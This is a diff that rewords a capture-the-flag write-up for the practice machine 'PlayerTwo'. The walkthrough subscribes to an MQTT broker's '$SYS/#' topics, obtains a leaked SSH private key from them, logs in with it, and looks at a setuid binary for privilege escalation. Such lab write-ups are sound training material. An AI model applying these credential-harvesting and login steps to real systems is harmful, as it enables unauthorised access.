 # Place your local configuration in /etc/mosquitto/conf.d/
@@ -599,7 +599,7 @@ bind_address 127.0.0.1
 include_dir /etc/mosquitto/conf.d
 ```
 
-First I started with `/etc/mosquitto/mosquitto.conf` since I had seen it in the `ps aux` output, but there wasn't anything very interesting there.  
+I began with `/etc/mosquitto/mosquitto.conf`, which I'd spotted in the `ps aux` output, but it didn't contain anything especially interesting.  
 
 ### Mosquitto \(MQTT\) Research
 
@@ -609,9 +609,9 @@ First I started with `/etc/mosquitto/mosquitto.conf` since I had seen it in the 
 * [https://mosquitto.org/man/mosquitto\_sub-1.html](https://mosquitto.org/man/mosquitto_sub-1.html)
 * [https://mosquitto.org/man/mqtt-7.html](https://mosquitto.org/man/mqtt-7.html)
 
-Next I did quite a bit of reading into the `Mosquitto` service, and found that it is a service for passing messages between applications and services.  Each can 'subscribe' to different topics, and will receive messages pushed to that topic, sort of like push notifications for apps on a cell phone.  It is intended to be lightweight and good for low power situations such as for IOT devices.  Perhaps if I could find the right topics to subscribe to, there would be some useful information that would help me to escalate my privileges.  
+I then read up on the `Mosquitto` service and learned it's a message broker that passes messages between applications and services.  Clients 'subscribe' to topics and receive any messages published to them, much like push notifications on a phone.  It's designed to be lightweight and suited to low-power scenarios like IOT devices.  Maybe subscribing to the right topics would surface information useful for escalating privileges.  
 
-I found that to subscribe to topics I needed to use the `mosquitto_sub` program.  The man page at [https://mosquitto.org/man/mosquitto\_sub-1.html](https://mosquitto.org/man/mosquitto_sub-1.html) gave me all the info I needed.
+I learned that subscribing to topics is done with the `mosquitto_sub` program.  Its man page at [https://mosquitto.org/man/mosquitto\_sub-1.html](https://mosquitto.org/man/mosquitto_sub-1.html) had everything I needed.
 
 > **mosquitto\_sub** is a simple MQTT version 5/3.1.1 client that will subscribe to topics and print the messages that it receives.
 >
@@ -643,15 +643,15 @@ Non-normative comment
 ·         For a Client to receive messages from topics that begin with $SYS/ and from topics that don’t begin with a $, it has to subscribe to both “#” and “$SYS/#”
 ```
 
-[https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html\#\_Toc3901014](https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901014) describes that topic subscription as: 
+[https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html\#\_Toc3901014](https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901014) characterizes that topic subscription as: 
 
 > $SYS/ has been widely adopted as a prefix to topics that contain Server-specific information or control APIs
 
-"Server-specific information or control APIs" sounded promising.
+"Server-specific information or control APIs" sounded very promising.
 
 ### Finding user creds
 
-In order to subscribe to `$SYS/#` I used some information from the `mosquitto.conf` file and the port I had found open from netstat.  `mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v`
+To subscribe to `$SYS/#` I combined details from the `mosquitto.conf` file with the open port netstat had shown.  `mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v`
 
 ```text
 observer@player2:~$ mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v
@@ -694,7 +694,7 @@ $SYS/internal/firmware/signing Verifying signing..
 $SYS/internal/firmware/signing Sent logs to apache server.
 ```
 
-I now was the proud owner of a shiny new SSH key! I took it and tried to log in as the `egre55` and `observer` users I saw earlier.
+I was now the proud owner of a brand-new SSH key! I grabbed it and tried logging in as the `egre55` and `observer` users I'd seen earlier.
 
 ```text
 kac0@kalimaa:~/htb/playertwo$ ssh -i observer_id_rsa observer@<YOUR_IP>
@@ -723,11 +723,11 @@ Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.2.5-050205-generic x86_64)
 Last login: Sun Dec  1 15:33:19 2019 from 172.16.118.129
 ```
 
-Success!  I was able to use the SSH private key to log in as the user `observer`.  While logging in I did notice a strange error `load pubkey "observer_id_rsa": invalid format`  but it didn't seem to cause any problems.  
+Success!  The SSH private key let me log in as `observer`.  Logging in did throw an odd error, `load pubkey "observer_id_rsa": invalid format`, but it caused no actual problems.  
 
 ### User.txt
 
-First order of business...claim my hard-earned user flag!
+First things first...grab my hard-earned user flag!
 
 ```text
 observer@player2:~$ cat user.txt 
@@ -740,9 +740,9 @@ _Yes, I know the real flag is in uppercase ._
 
 ### Enumeration as User `observer`
 
-While logging in, I noticed the MOTD stated `121 packages out of date, 5 security updates`.  I'm sure that at least 124 of those were rabbit holes so I didn't pay too much attention to it, and proceeded to enumerate the machine more deeply.
+During login the MOTD noted `121 packages out of date, 5 security updates`.  At least 124 of those were almost certainly rabbit holes, so I ignored it and dug deeper into enumerating the box.
 
-While looking through the files that had the SUID bit set, I noticed that `/opt/Configuration_Utility/Protobs`stood out. 
+Combing through SUID-bit files, `/opt/Configuration_Utility/Protobs` jumped out at me. 
 
 ```text
 observer@player2:~$ cd /opt/Configuration_Utility/
@@ -752,8 +752,8 @@ observer@player2:/opt/Configuration_Utility$ file Protobs
 Protobs: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/Con, for GNU/Linux 3.2.0, BuildID[sha1]=53892814b4e50f2f75dd5fa98b077741917688a2, stripped
 ```
 
-It looked like I had found the configuration utility for the `protobs` program, which has the `setuid` bit set. This looks like something that could possibly be used to do my privilege escalation. The two `.so` files look like clues as to how the file is built, though unfortunately I am quite weak on C programming and with reverse engineering and binary exploitation, so this may be a bit beyond me for now. I will return to this one at a later date after I learn more.
+I'd apparently found the configuration utility for the `protobs` program, and it carried the `setuid` bit. This looked like a viable path for privilege escalation. The two `.so` files seemed to hint at how the binary was built, but unfortunately my C, reverse engineering, and binary exploitation skills are weak, so this is probably beyond me for now. I'll come back to it once I've learned more.
 
 ### Root.txt
 
-![Nope.](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-nope.png)
+![Nope.](assets/wu/playertwo/img-6.png)
